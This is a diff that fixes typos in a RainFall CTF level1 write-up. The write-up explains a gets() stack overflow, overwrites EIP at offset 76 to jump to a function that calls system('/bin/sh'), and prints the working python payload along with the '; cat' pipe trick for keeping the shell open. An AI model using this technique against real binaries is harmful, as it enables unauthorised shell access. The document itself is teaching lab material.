@@ -6,12 +6,12 @@ lets debug using gdb fist thing after using info functions we have two function 
 
 main function create a buffer and call gets function to store the input in the buffer we know that gets function over flow the stack so basically if we give an input bigger than the buffer size we will have a segfault
 
-run function call fwrite to print somthing then call system function with /bin/sh as arg
+run function call fwrite to print something then call system function with /bin/sh as arg
 
 so lets try to overflow the stack then overwrite eip register with the adresse of run function
 
 at 76 program segfault and after 76 we write into the eip
-so the exploit will be somthing like this 
+so the exploit will be something like this 
 
 python -c "print('A' * 76 + '\x44\x84\x04\x08')" | ./level1
 
@@ -21,7 +21,7 @@ level1@RainFall:~$ python -c "print('A' * 76 + '\x44\x84\x04\x08')" | ./level1
 Good... Wait what?
 Segmentation fault (core dumped)
 
-now we need to stabilize the shell through the pipline after some research on google I got a solution the exploit will somthing like
+now we need to stabilize the shell through the pipline after some research on google I got a solution
 
 (python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
 we stabilized the shell now we can print .pass
